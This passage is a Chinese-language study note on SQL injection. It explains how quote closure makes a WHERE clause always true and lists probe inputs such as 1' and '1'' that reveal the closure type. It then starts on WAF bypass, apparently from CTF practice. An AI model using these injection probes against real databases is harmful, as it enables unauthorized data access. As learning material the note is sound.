where语句的判断标准是，遍历整张表，找到可以使where后面的语句为真的就行，输出该行的所有字段值（column），而这样的输入会导致，where后的语句永远为真，就可以不考虑id，直接输出所有字段值

由此可见，构造闭合的目的在于成功构造where后永真的字符串，如果有一种神奇的方法可以不用构造闭合就能达到相同的目的，那大家也可以积极尝试。

大多数sql注入都是黑盒注入，所以实际上需要判断闭合类型（非常重要的一点，所有的sql注入都要以判断闭合类型为基础），那么如何判断闭合呢？

后台实际输入 执行语句 是否报错 以及 相关解释
"1'" SELECT username,password FROM users WHERE id = "1'" "" 中为可以包含 ' ，而 1' 是一个合法的字符串 , 在查询时会先被强制类型转换为数字，不会报错
1' SELECT username,password FROM users WHERE id = 1' 这里的 ' 就没有闭合，会报错。
'1'' SELECT username,password FROM users WHERE id = '1'' 这里的 '与前序的' 闭合了但这样就留下了后序单着的 '，会报错。

如下表格描述，回显语句会在报错的点加上 ‘’ ,所以当我们去掉一个引号之后，再去掉自己去掉的内容，就是闭合方式

waf绕过

今天做到了一个题非常有意思，考察了waf绕过，Web Application Firewall的官方定义我这里就不阐述了，下面是我自己的一点理解。

waf会在前端与后端服务器之间设立一道墙，并且设置了一定的过滤规则，当前端向后端发送的数据包不符合waf的规则时，waf就会阻止数据包的发送，使得前端不能成功向后端发送数据包。

举个例子：waf过滤了空格，那我从前端使用get方法向后端传递一个参数，

这是sql注入中非常经典的一个payload，因为参数中包含了空格，所以会被waf拦截，后端服务器也就不会接收到来自前端的wllm参数（注意，不是传送到后端被后端过滤，而是后端根本不会接收到这样的参数）

通常情况下我们不会看到waf的过滤规则，只能通过构造SQL注入的payload一点一点猜，在猜测出过滤了哪些字符之后，就可以使用一些方式去绕过waf，我会随着我的学习进度来补充绕过格式的
